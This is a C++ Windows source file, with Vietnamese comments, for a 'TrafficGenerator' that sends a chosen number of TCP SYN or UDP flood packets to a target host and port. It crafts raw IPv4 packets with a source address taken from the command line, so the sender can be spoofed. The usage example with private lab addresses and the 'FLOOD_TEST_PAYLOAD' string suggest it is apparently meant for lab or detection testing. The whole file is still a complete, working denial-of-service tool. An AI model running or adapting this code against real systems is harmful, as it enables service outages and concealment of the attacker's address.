#include "PacketHeaders.h"
#include <ws2tcpip.h>
#include <iostream>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "ws2_32.lib")

// Tính Checksum cho TCP hoặc UDP (bao gồm Pseudo Header)
uint16_t ComputeTransportChecksum(uint32_t srcIp, uint32_t dstIp, uint8_t proto,
                                  const void* transportHdr, uint16_t transportLen) {
    char buf[1500] = { 0 };
    pseudo_hdr psh{};
    psh.source_address = srcIp;
    psh.dest_address   = dstIp;
    psh.placeholder    = 0;
    psh.protocol       = proto;
    psh.tcp_udp_length = htons(transportLen);

    memcpy(buf, &psh, sizeof(pseudo_hdr));
    memcpy(buf + sizeof(pseudo_hdr), transportHdr, transportLen);

    return CalculateChecksum(reinterpret_cast<uint16_t*>(buf), sizeof(pseudo_hdr) + transportLen);
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cout << "Cach dung: TrafficGenerator.exe <syn|udp> <IP_Nguon> <IP_Dich> <Port_Dich> [So_Goi]\n";
        std::cout << "Vi du:    TrafficGenerator.exe syn 192.168.56.101 192.168.56.103 8080 500\n";
        return 1;
    }

    std::string mode      = argv[1];
    const char* srcIpStr  = argv[2];
    const char* dstIpStr  = argv[3];
    uint16_t    dstPort   = static_cast<uint16_t>(std::stoi(argv[4]));
    int         numPkts   = (argc >= 6) ? std::stoi(argv[5]) : 500;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    int proto = (mode == "syn") ? IPPROTO_TCP : IPPROTO_UDP;
    SOCKET sock = socket(AF_INET, SOCK_RAW, proto);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[ERROR] Khong the tao SOCK_RAW (Kiem tra quyen Admin & DisableRawSecurity).\n";
        WSACleanup();
        return 1;
    }

    // Bật IP_HDRINCL để tự đóng gói IP Header
    BOOL optVal = TRUE;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, reinterpret_cast<char*>(&optVal), sizeof(optVal)) == SOCKET_ERROR) {
        std::cerr << "[ERROR] setsockopt(IP_HDRINCL) that bai: " << WSAGetLastError() << "\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    uint32_t srcIp = 0, dstIp = 0;
    InetPtonA(AF_INET, srcIpStr, &srcIp);
    InetPtonA(AF_INET, dstIpStr, &dstIp);

    sockaddr_in targetAddr{};
    targetAddr.sin_family      = AF_INET;
    targetAddr.sin_port        = htons(dstPort);
    targetAddr.sin_addr.s_addr = dstIp;

    char packet[256] = { 0 };
    ip_hdr* ip = reinterpret_cast<ip_hdr*>(packet);

    std::cout << "[INFO] Dang gui " << numPkts << " goi " << mode << " Flood toi "
              << dstIpStr << ":" << dstPort << "...\n";

    for (int i = 0; i < numPkts; ++i) {
        ZeroMemory(packet, sizeof(packet));

        ip->version  = 4;
        ip->ihl      = 5;
        ip->tos      = 0;
        ip->id       = htons(static_cast<uint16_t>(1000 + i));
        ip->frag_off = 0;
        ip->ttl      = 64;
        ip->protocol = static_cast<uint8_t>(proto);
        ip->saddr    = srcIp;
        ip->daddr    = dstIp;

        uint16_t totalLen = 0;

        if (mode == "syn") {
            tcp_hdr* tcp = reinterpret_cast<tcp_hdr*>(packet + sizeof(ip_hdr));
            tcp->source  = htons(static_cast<uint16_t>(20000 + (i % 40000)));
            tcp->dest    = htons(dstPort);
            tcp->seq     = htonl(100000 + i);
            tcp->ack_seq = 0;
            tcp->doff    = 5;
            tcp->syn     = 1;
            tcp->window  = htons(65535);
            tcp->check   = ComputeTransportChecksum(srcIp, dstIp, IPPROTO_TCP, tcp, sizeof(tcp_hdr));

            totalLen     = sizeof(ip_hdr) + sizeof(tcp_hdr);
        }
        else {
            udp_hdr* udp = reinterpret_cast<udp_hdr*>(packet + sizeof(ip_hdr));
            const char* payload = "FLOOD_TEST_PAYLOAD";
            uint16_t payloadLen = static_cast<uint16_t>(strlen(payload));
            uint16_t udpLen     = sizeof(udp_hdr) + payloadLen;

            udp->source = htons(static_cast<uint16_t>(30000 + (i % 30000)));
            udp->dest   = htons(dstPort);
            udp->len    = htons(udpLen);
            memcpy(packet + sizeof(ip_hdr) + sizeof(udp_hdr), payload, payloadLen);
            udp->check  = ComputeTransportChecksum(srcIp, dstIp, IPPROTO_UDP, udp, udpLen);

            totalLen    = sizeof(ip_hdr) + udpLen;
        }

        ip->tot_len = htons(totalLen);
        ip->check   = CalculateChecksum(reinterpret_cast<uint16_t*>(ip), sizeof(ip_hdr));

        sendto(sock, packet, totalLen, 0, reinterpret_cast<sockaddr*>(&targetAddr), sizeof(targetAddr));
    }

    std::cout << "[DONE] Hoan tat gui luong kiem thu.\n";
    closesocket(sock);
    WSACleanup();
    return 0;
}